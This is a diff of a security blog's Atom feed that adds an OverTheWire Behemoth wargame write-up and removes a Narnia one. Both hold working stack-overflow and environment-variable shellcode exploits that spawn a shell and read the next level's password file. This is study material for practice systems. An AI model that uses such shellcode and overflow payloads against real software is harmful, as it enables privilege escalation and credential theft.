@@ -1,4 +1,98 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-26T07:01:21+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Pluck</title><link href="http://localhost:4000/vulnhub-pluck/" rel="alternate" type="text/html" title="Vulnhub.com - Pluck" /><published>2017-03-26T02:00:00+00:00</published><updated>2017-03-26T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-pluck</id><content type="html" xml:base="http://localhost:4000/vulnhub-pluck/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-04-02T20:00:56+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Overthewire.org - Behemoth 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire.org-behemoth-2/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 1 -&gt; 2" /><published>2017-04-02T00:00:00+00:00</published><updated>2017-04-02T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-behemoth-2</id><content type="html" xml:base="http://localhost:4000/overthewire.org-behemoth-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we're going to attack another reverse engineering challenge from &lt;b&gt;Behemoth&lt;/b&gt; series, to improve our Wknowledge in reverse engineering.  &lt;/p&gt;
+
+&lt;h1&gt;Challenge&lt;/h1&gt;
+
+&lt;p&gt;This one seems to behave quite similar as the &lt;b&gt;behemoth0&lt;/b&gt; level, but unluckily we can't view the password like in the previous one. Let's dissasemble the binary. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-asm&quot; data-lang=&quot;asm&quot;&gt;(gdb) disas main
+Dump of assembler code for function main:
+   0x0804845d &amp;lt;+0&amp;gt;:	push   %ebp
+   0x0804845e &amp;lt;+1&amp;gt;:	mov    %esp,%ebp
+   0x08048460 &amp;lt;+3&amp;gt;:	and    $0xfffffff0,%esp
+   0x08048463 &amp;lt;+6&amp;gt;:	sub    $0x60,%esp
+   0x08048466 &amp;lt;+9&amp;gt;:	movl   $0x8048530,(%esp)
+   0x0804846d &amp;lt;+16&amp;gt;:	call   0x8048310 &amp;lt;printf@plt&amp;gt;
+   0x08048472 &amp;lt;+21&amp;gt;:	lea    0x1d(%esp),%eax
+   0x08048476 &amp;lt;+25&amp;gt;:	mov    %eax,(%esp)
+   0x08048479 &amp;lt;+28&amp;gt;:	call   0x8048320 &amp;lt;gets@plt&amp;gt;
+   0x0804847e &amp;lt;+33&amp;gt;:	movl   $0x804853c,(%esp)
+   0x08048485 &amp;lt;+40&amp;gt;:	call   0x8048330 &amp;lt;puts@plt&amp;gt;
+   0x0804848a &amp;lt;+45&amp;gt;:	mov    $0x0,%eax
+   0x0804848f &amp;lt;+50&amp;gt;:	leave  
+   0x08048490 &amp;lt;+51&amp;gt;:	ret    
+End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmm, we have &lt;b&gt;printf&lt;/b&gt;, &lt;b&gt;gets&lt;/b&gt; and &lt;b&gt;puts&lt;/b&gt; function. We will have to somehow exploit the &lt;b&gt;gets&lt;/b&gt; function, by overflowing an buffer and then possibly we will be able to spawn a shell. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/behemoth$ &lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*200'&lt;/span&gt; | ./behemoth1
+Password: Authentication failure.
+Sorry.
+Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now we have something to focus on. This time, I wanted to find an offset not by brute forcing (also known as guessing), but by running &lt;b&gt;pattern_offset.rb&lt;/b&gt; on the value in &lt;b&gt;EIP&lt;/b&gt; - which resulted in number &lt;b&gt;79&lt;/b&gt;. But how can we store the shellcode, since nothing is actually stored in the binary?  &lt;/p&gt;
+
+&lt;p&gt;In one of the &lt;b&gt;Narnia&lt;/b&gt; levels, we used enviromental variable as the way to store the shellcode. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/behemoth$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;EGG&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;\x90&quot;*100+&quot;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&quot;'&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now we can use a tool like &lt;a href=&quot;https://github.com/Partyschaum/haxe/blob/master/getenvaddr.c&quot;&gt;&lt;b&gt;getenvaddr&lt;/b&gt;&lt;/a&gt; to get the address of the enviromental variable &lt;b&gt;EGG&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp$ &lt;/span&gt;mkdir muuuuu
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;muuuuu
+behemoth1@melinda:/tmp/muuuuu&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp/muuuuu$ &lt;/span&gt;touch getenvaddr.c
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp/muuuuu$ &lt;/span&gt;nano getenvaddr.c
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp/muuuuu$ &lt;/span&gt;gcc getenvaddr.c -o getenvaddr
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/tmp/muuuuu$ &lt;/span&gt;./getenvaddr EGG /behemoth/behemoth1
+EGG will be at 0x7fffffffe8ac
+behemoth1@melinda:/tmp/muuuuu&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unluckily it didn't seem to work, so I had to come up with another solution, using &lt;b&gt;gdb&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/behemoth$ &lt;/span&gt;gdb behemoth1
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x08048479
+Breakpoint 1 at 0x8048479
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
+Starting program: /games/behemoth/behemoth1
+
+Breakpoint 1, 0x08048479 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;main &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd828:	&lt;span class=&quot;s2&quot;&gt;&quot;XDG_SESSION_ID=478012&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd83e:	&lt;span class=&quot;s2&quot;&gt;&quot;SHELL=/bin/bash&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd84e:	&lt;span class=&quot;s2&quot;&gt;&quot;TERM=xterm-256color&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd862:	&lt;span class=&quot;s2&quot;&gt;&quot;SSH_CLIENT=89.64.16.127 33128 22&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd883:	&lt;span class=&quot;s2&quot;&gt;&quot;SSH_TTY=/dev/pts/12&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd897:	&lt;span class=&quot;s2&quot;&gt;&quot;LC_ALL=C&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ+6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+0xffffd8a0:	&lt;span class=&quot;s2&quot;&gt;&quot;EGG=&quot;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;'\220'&lt;/span&gt; &amp;lt;repeats 100 &lt;span class=&quot;nb&quot;&gt;times&lt;/span&gt;&amp;gt;, &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15C&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11Qhn/shh//bi&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15A&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\v\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\3&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now we have to only point the address to our shellcode. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/behemoth$  &lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*79+&quot;\xb0\xd8\xff\xff&quot;'&lt;/span&gt; | ./behemoth1
+Password: Authentication failure.
+Sorry.
+&lt;span class=&quot;gp&quot;&gt;behemoth1@melinda:/behemoth$ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python -c &lt;span class=&quot;s1&quot;&gt;'print &quot;A&quot;*79+&quot;\xb0\xd8\xff\xff&quot;'&lt;/span&gt;;cat&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | ./behemoth1
+Password: Authentication failure.
+Sorry.
+whoami
+behemoth2
+cat /etc/behemoth_pass/behemoth2
+&lt;span class=&quot;k&quot;&gt;*******&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;As you may know, first try didn't work becaouse the shellcode opened the shell without any argumants, resulting in immediate close. Adding &lt;b&gt;cat - &lt;/b&gt; allowed us to keep the shell open, and view the password. &lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;Fun as always, and very educational. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
+&lt;p&gt;I would also like to point out that if you're thinking about starting journey with CTF challenges &lt;a href=&quot;https://picoctf.com/&quot;&gt;&lt;b&gt;PicoCTF&lt;/b&gt;&lt;/a&gt; is now running, with a lot of great challenges. Check that out if you're interested!&lt;/p&gt;
+
+&lt;p&gt;~ Stay safe! &lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Vulnhub.com - Pluck</title><link href="http://localhost:4000/vulnhub-pluck/" rel="alternate" type="text/html" title="Vulnhub.com - Pluck" /><published>2017-03-26T02:00:00+00:00</published><updated>2017-03-26T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-pluck</id><content type="html" xml:base="http://localhost:4000/vulnhub-pluck/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;In this post we're going to work on a short, but still great machine from &lt;b&gt;Vulnhub&lt;/b&gt; called &lt;a href=&quot;https://www.vulnhub.com/entry/pluck-1,178/&quot;&gt;&lt;b&gt;Pluck&lt;/b&gt;&lt;/a&gt;. Let's start! &lt;/p&gt;
 
@@ -233,7 +327,7 @@ Congratulations you found the flag
 
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 
-&lt;p&gt;It was nice little challenge with little dose of suprises. Thanks &lt;a href=&quot;https://twitter.com/@ryanoberto&quot;&gt;&lt;b&gt;Ryan Oberto&lt;/b&gt;&lt;/a&gt; for creating this great challenge, &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; for hosting and &lt;b&gt;Yodak#2187&lt;/b&gt; for joining!  &lt;/p&gt;
+&lt;p&gt;It was nice little challenge with little dose of surprises. Thanks &lt;a href=&quot;https://twitter.com/@ryanoberto&quot;&gt;&lt;b&gt;Ryan Oberto&lt;/b&gt;&lt;/a&gt; for creating this great challenge, &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; for hosting and &lt;b&gt;Yodak#2187&lt;/b&gt; for joining!  &lt;/p&gt;
 
 &lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Vulnhub.com - Billy Madison 1.1</title><link href="http://localhost:4000/vulnhub-billy-madison/" rel="alternate" type="text/html" title="Vulnhub.com - Billy Madison 1.1" /><published>2017-03-19T02:00:00+00:00</published><updated>2017-03-19T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-billy-madison</id><content type="html" xml:base="http://localhost:4000/vulnhub-billy-madison/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
@@ -2629,67 +2723,4 @@ $ cat /etc/narnia_pass/narnia3&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 &lt;h1&gt;Conclusion&lt;/h1&gt;
 &lt;p&gt;The challenge was awesome, but really time consuming. It was worth every minute as I learned a lot from trying out these different ways to finish this level. Thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;!&lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Narnia 1 -&amp;gt; 2</title><link href="http://localhost:4000/overthewire.org-narnia-2/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 1 -&gt; 2" /><published>2017-02-02T00:00:00+00:00</published><updated>2017-02-02T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-2</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-2/">&lt;h1&gt;Introduction&lt;/h1&gt;
-&lt;p&gt;Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!&lt;/p&gt;
-
-&lt;h1&gt;Challenge&lt;/h1&gt;
-
-&lt;p&gt;Firstly let's take a look at the code of the program. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)();&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;    
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Give me something to execute at the env-variable EGG&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Trying to execute EGG!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getenv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;The first thing that I see is that this program will check, whether or not the value of EGG variable is empty, if yes, it will print the message. But if not, it will try to execute it. &lt;/p&gt;
-
-&lt;p&gt;But what is enviromental variable? &lt;/p&gt;
-
-&lt;p&gt;Every time shell session is started, process is gathering information that should be available to the shell process and all child processes, putting them in special area called &lt;b&gt;enviroment&lt;/b&gt;. &lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;Enviromental variables&lt;/b&gt; provide a way to influence the behaviour of software on the system. For example, the &quot;LANG&quot; environment variable determines the language in which software programs communicate with the user. They are represented as an key-value pairs. &lt;/p&gt;
-
-&lt;pre&gt;
-KEY=VALUE
-KEY=VALUE1:VALUE2
-KEY=&quot;VALUE WITH SPACES&quot;
-&lt;/pre&gt;
-
-&lt;p&gt;Now when we understand the topic, let's try to set EGG variable as some random text possibly causing the program to crash. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;completelyrandomtext&quot;&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;./narnia1
-Trying to execute EGG!
-Segmentation fault&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Yes! Now let's try and find some x86 shellcode that will be executed by the program. What I found working, was this &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-811.php&quot;&gt;shellcode&lt;/a&gt;, which was actually second one I've tried - the first one didn't want to cooperate ;)&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;narnia1@melinda:/narnia$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;EGG&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;50&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;73&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;68&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;2f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;62&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;69&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;6e&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;e3&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;89&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c2&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;b0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;31&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c0&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;40&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;80&lt;span class=&quot;s1&quot;&gt;'
-narnia1@melinda:/narnia$ ./narnia1
-Trying to execute EGG!
-$ whoami
-narnia2
-$ cat /etc/narnia_pass/narnia2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We have the password to the next level! &lt;/p&gt;
-
-&lt;h1&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;It was another great challenge from &lt;a href=&quot;www.overthewire.org&quot;&gt;OverTheWire&lt;/a&gt;. I'm looking forward to the next one, maybe something a little bit harder? We'll see!&lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;UPDATE&lt;/b&gt;&lt;/p&gt;
-&lt;p&gt;To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the &lt;a href=&quot;/privacy/&quot;&gt;Privacy Policy&lt;/a&gt;, but if you still have any questions, contact me and I'll try my best to answer. &lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry></feed>
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry></feed>
